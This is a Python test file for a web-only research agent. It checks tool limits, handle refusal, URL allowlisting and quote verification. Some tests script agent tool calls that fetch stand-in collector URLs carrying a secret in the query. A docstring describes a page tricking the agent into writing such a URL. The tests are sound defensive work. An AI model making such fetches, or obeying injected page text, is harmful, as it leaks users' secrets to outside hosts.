"""The researcher: an agent with the web, nothing else.

It is offered `web_search` and `web_fetch` alone; it is given none of the session's files; what
its task names may be fetched; its report's findings quote pages, each quote checked against the
page the round fetched; and every request it makes is on the session log, recorded by the
external-call policy.
"""

from __future__ import annotations

from pathlib import Path

from agents_helpers import AgentClient, agents_for, report, turn_calls, turn_text, write_repo
from webs import DictEngine, calls, public, reads

from chickadee.agents.profiles import Profile, ProfileLimits
from chickadee.agents.spawn import AgentPorts, Agents
from chickadee.context.results import InvalidArgument
from chickadee.context.session import Session
from chickadee.external.policy import ExternalPolicy
from chickadee.external.search import Source
from chickadee.external.web import Web
from chickadee.roles import ZEUS_CEILING, role

PAGE = "https://docs.example.org/limits"


def researcher() -> Profile:
    r = role("researcher")
    assert r.tool_defaults is not None
    limits = ProfileLimits(
        max_tool_calls=30,
        max_result_tokens=10_000,
        seconds=600,
        max_cost_cents=50,
        report_reasks=1,
    )
    return Profile("researcher", "researcher", r.tool_defaults.enabled, "mid-param", limits)


def researchers(
    tmp_path: Path, session: Session, client: AgentClient, engine: DictEngine
) -> Agents:
    """The session's agents, a researcher among them, its `Web` over `engine`: built again
    for a follow-up, as a resumed session builds them."""

    def ports(profile: Profile) -> AgentPorts:
        policy = ExternalPolicy(session, rung=profile.rung)
        return AgentPorts(
            web=Web(policy, engine=engine, resolve=public, sources=list[Source]())
        )

    return agents_for(
        session,
        write_repo(tmp_path / "repo"),
        client,
        profiles={"researcher": researcher()},
        handles={"h1": "the repository's secret config"},
        ports=ports,
    )


def spawn(
    tmp_path: Path, client: AgentClient, pages: dict[str, str], *handles: str
) -> tuple[str | InvalidArgument, Session, DictEngine]:
    session = Session.create(tmp_path / "sessions", "S-research")
    engine = DictEngine(pages)
    out = researchers(tmp_path, session, client, engine).spawn(
        None, "researcher", f"What is the limit? Start at {PAGE}.", handles, call_id="z1"
    )
    return out, session, engine


def test_its_role_holds_the_web_port_and_nothing_else() -> None:
    r = role("researcher")
    assert r.tool_ceiling.ports == frozenset({"web"})
    assert r.tool_defaults is not None
    assert r.tool_defaults.enabled == ("web_search", "web_fetch")
    assert r.tool_ceiling.ports <= ZEUS_CEILING.ports


def test_zeus_holds_the_web_port_and_is_offered_no_web_tool() -> None:
    zeus = role("zeus").tool_defaults
    assert zeus is not None and not {"web_search", "web_fetch"} & set(zeus.enabled)


def test_it_is_offered_the_web_tools_alone_and_told_to_quote_pages(tmp_path: Path) -> None:
    client = AgentClient(turn_text(report()))
    out, session, _ = spawn(tmp_path, client, {})
    try:
        assert isinstance(out, str) and "researcher · complete" in out
        request = client.requests[0]
        assert sorted(t.name for t in request.tools) == ["web_fetch", "web_search"]
        system = str(request.messages[0].content)
        assert "web research agent" in system
        assert 'https://example.org/page "the exact words, copied"' in system
        assert "path/to/file.py:40-52" not in system
    finally:
        session.close()


def test_it_is_given_no_handle_of_the_session(tmp_path: Path) -> None:
    client = AgentClient()
    out, session, _ = spawn(tmp_path, client, {}, "h1")
    try:
        assert isinstance(out, InvalidArgument) and out.field == "handles"
        assert out.render() == (
            "INVALID_ARGUMENTS{field: handles, reason: 'the researcher profile reads no "
            "files, so it is given none'}. Do: put what it must know in the task, in your own "
            "words, and send no handles"
        )
        assert not client.requests
    finally:
        session.close()


def test_a_url_in_its_task_may_be_fetched_and_its_quote_is_checked(tmp_path: Path) -> None:
    client = AgentClient(
        turn_calls(("web_fetch", {"url": PAGE})),
        turn_text(
            report(
                f'- One call reads 40,000 characters: {PAGE} "at most 40,000 characters"\n'
                f'- And one more claim: {PAGE} "a claim the page never makes"'
            )
        ),
    )
    out, session, engine = spawn(
        tmp_path, client, {PAGE: "A fetch returns at most 40,000 characters of a page."}
    )
    try:
        assert isinstance(out, str)
        assert engine.asked == [PAGE]
        assert "1 quoted from the page fetched · 1 rejected" in out
        assert f'FLAGGED: {PAGE} "a claim the page never makes" NOT_ON_PAGE' in out
        assert "only the locations and quotes above were checked" in out
        (p,) = calls(session)
        assert (p.provider, p.tool, p.ok) == ("web.fetch.test", "web_fetch", True)
        (read,) = reads(session)
        assert (read.path, read.rung) == (PAGE, "mid-param")
    finally:
        session.close()


def test_a_url_nobody_gave_it_is_refused_and_the_refusal_is_its_answer(
    tmp_path: Path,
) -> None:
    client = AgentClient(
        turn_calls(("web_fetch", {"url": "https://elsewhere.example/?q=secret"})),
        turn_text(report()),
    )
    out, session, engine = spawn(tmp_path, client, {})
    try:
        assert isinstance(out, str) and not engine.asked and not calls(session)
        answer = str(client.requests[1].messages[-1].content)
        assert answer.startswith("URL_REFUSED{url: 'https://elsewhere.example/?q=secret'")
    finally:
        session.close()


def test_a_url_it_wrote_itself_is_not_admitted_by_a_follow_up(tmp_path: Path) -> None:
    """What the agent wrote is no URL it was given: a page that talked it into writing one
    must not get it fetched on the next round."""
    leak = "https://collector.example/?q=the-secret"
    out, session, engine = spawn(
        tmp_path, AgentClient(turn_text(report(f"- See {leak} for more"))), {}
    )
    try:
        assert isinstance(out, str)
        second = AgentClient(turn_calls(("web_fetch", {"url": leak})), turn_text(report()))
        researchers(tmp_path, session, second, engine).follow_up(
            "A1", "Read the page you mentioned.", call_id="z2"
        )
        assert not engine.asked
        answer = str(second.requests[1].messages[-1].content)
        assert answer.startswith(f"URL_REFUSED{{url: '{leak}'")
    finally:
        session.close()


def test_a_follow_up_may_quote_a_page_an_earlier_round_fetched(tmp_path: Path) -> None:
    finding = f'- One call reads 40,000 characters: {PAGE} "at most 40,000 characters"'
    first = AgentClient(turn_calls(("web_fetch", {"url": PAGE})), turn_text(report(finding)))
    out, session, engine = spawn(
        tmp_path, first, {PAGE: "A fetch returns at most 40,000 characters of a page."}
    )
    try:
        assert isinstance(out, str) and "1 quoted from the page fetched" in out
        second = AgentClient(turn_text(report(finding)))
        again = researchers(tmp_path, session, second, engine).follow_up(
            "A1", "Say it again.", call_id="z2"
        )
        assert isinstance(again, str)
        assert "1 quoted from the page fetched" in again and "NOT_FETCHED" not in again
        assert engine.asked == [PAGE]
    finally:
        session.close()
